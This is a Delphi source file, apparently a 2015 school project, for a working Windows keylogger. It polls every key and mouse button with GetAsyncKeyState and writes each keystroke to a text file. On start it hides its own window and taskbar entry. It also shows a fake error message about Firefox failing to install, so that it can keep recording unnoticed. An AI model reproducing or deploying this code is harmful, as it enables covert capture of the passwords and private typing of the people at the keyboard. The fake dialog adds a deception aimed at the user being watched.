unit Unit1;

{
   Description: Simple Keylogger without THook
   Authors: Timothy Schiess, Florian Huwyler, Alain Stulz
   Date: 19.02.2015 - 26.02.2015
}

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls;

type
  TForm1 = class(TForm)
    Button1: TButton;
    Memo1: TMemo;
    Timer1: TTimer;
    Memo2: TMemo;
    procedure Button1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private-Deklarationen }
  public
    { Public-Deklarationen }
  end;

var
  Form1: TForm1; d:string;

implementation

{$R *.dfm}

function DisplayAction(txt: String): String; // Adds text to Memo if exception is detected
begin
form1.Memo1.Lines.add(txt);
end;

procedure TForm1.Button1Click(Sender: TObject); // Clears all memos
begin
  Memo1.text := '';
  Memo2.Text := '';
  Memo2.SetFocus;
end;

procedure TForm1.FormCreate(Sender: TObject); //Writes Lines to .txt
var f:textfile; Gaben:String;
begin
randomize;
d:= 'S:\Informatik EF 2015\lökj\' +  datetostr(now)+'_' +IntToStr(random(100000))+ '.txt'; //location of .txt file
assignfile(f,d);
rewrite(f);
writeln(f,Gaben); //Adds our Lord and Savior Gaben
// writeln(f, 'Time Written: ' + datetostr(now)); only works when nothing is added
memo1.lines.add('KeyloggerProtocol - EF Info');
memo1.lines.add('Time Written: ' + datetostr(now));
closefile(f);
Application.ShowMainForm := False;   //Hides Form
Application.MainFormOnTaskbar := false; //Hides Label on the bottom taskbar
MessageDlg('ERROR! Firefox can not be installed on this PC. You do not have the required permission to do so. Please consult your IT departement to resolve this issue.',mtError,[mbCancel,mbHelp], 1);
end;

procedure TForm1.Timer1Timer(Sender: TObject); //Main Procedure based of an interval
var
InputKey, KeyResult : Integer;
Pressed: Bool;
f:textfile;

begin
InputKey := 0;
repeat
KeyResult := GetAsyncKeyState(InputKey);
if KeyResult = -32767 then
begin
  case InputKey of
    1: DisplayAction(' [MOUSE LEFT] ');
    2: DisplayAction(' [MOUSE RIGHT] ');
    4: DisplayAction(' [MOUSE WHEEL CLICK] ');
    8: DisplayAction(' [BACKSPACE] ');
    9: DisplayAction(' [TAB] ');
    12: DisplayAction(' [ALT] ');
    13: DisplayAction(' [ENTER] ');
    16: Pressed := True;  //DisplayAction(' [SHIFT] ');
    17: DisplayAction(' [CONTROL] ');
    18: DisplayAction(' [ALT] ');
    19: DisplayAction(' [BREAK] ');
    20: DisplayAction(' [CAPS LOCK] ');
    27: DisplayAction(' [ESC] ');
    32: DisplayAction(' [SPACE] ');
    33: DisplayAction(' [PAGE UP] ');
    34: DisplayAction(' [PAGE DN] ');
    35: DisplayAction(' [END] ');
    36: DisplayAction(' [HOME] ');
    37: DisplayAction(' [LEFT ARROW] ');
    38: DisplayAction(' [UP ARROW] ');
    39: DisplayAction(' [RIGHT ARROW] ');
    40: DisplayAction(' [DOWN ARROW] ');
    44: DisplayAction(' [PRINT SCREEN] ');
    45: DisplayAction(' [INSERT] ');
    46: DisplayAction(' [DELETE] ');
    91: DisplayAction(' [WINDOWS] ');
    96: DisplayAction(' 0 ');
    97: DisplayAction(' 1 ');
    98: DisplayAction(' 2 ');
    99: DisplayAction(' 3 ');
    100: DisplayAction(' 4 ');
    101: DisplayAction(' 5 ');
    102: DisplayAction(' 6 ');
    103: DisplayAction(' 7  ');
    104: DisplayAction(' 8 ');
    105: DisplayAction(' 9 ');
    106: DisplayAction(' * ');
    107: DisplayAction(' + ');
    109: DisplayAction(' - ');
    110: DisplayAction(' . ');
    111: DisplayAction(' / ');
    112: DisplayAction(' [F1] ');
    113: DisplayAction(' [F2] ');
    114: DisplayAction(' [F3] ');
    115: DisplayAction(' [F4] ');
    116: DisplayAction(' [F5] ');
    117: DisplayAction(' [F6] ');
    118: DisplayAction(' [F7] ');
    119: DisplayAction(' [F8] ');
    120: DisplayAction(' [F9] ');
    121: DisplayAction(' [F10] ');
    122: DisplayAction(' [F11] ');
    123: Application.ShowMainForm := true; //DisplayAction(' [F12] ');
    144: DisplayAction(' [NUM LOCK] ');
    145: DisplayAction(' [SCROLL LOCK] ');
    160: ; // Shift Left
    161: ; // Shift Right
    162: ; // Control Left
    163: ; // Control Right
    164: ; // Alt Left
    165: ; // Alt Right
    186: DisplayAction(' ü ');
    187: DisplayAction(' = ');
    188: DisplayAction(' , ');
    189: DisplayAction(' - ');
    190: DisplayAction(' . ');
    191: DisplayAction(' § ');
    192: DisplayAction(' ¨ ');
    193: DisplayAction(' / ');
    219: DisplayAction(' ´ ');
    220: DisplayAction(' ä ');
    221: DisplayAction(' ^ ');
    222: DisplayAction(' ö ');
    223: DisplayAction(' $ ');
    226: DisplayAction(' < ');
  else if (InputKey >=32) and (InputKey <=110) AND (InputKey <> 64) then
  begin
    if pressed then Memo1.Text := Memo1.Text + Uppercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey)
    else Memo1.Text := Memo1.Text + Lowercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey);
    Memo1.Lines.Add('');
    //Memo1.Lines.SaveToFile(d);
  end
  else // Exception for all undefin ed keys
    Memo1.Lines.Add(IntToStr(InputKey));
  end; {of ELSE}
  Memo1.Lines.SaveToFile(d);  //saves the lines from the form to the .txt file¨and rewrites the file
  end; {of CASE}
  Inc(InputKey);
until InputKey = 255
end;
end.
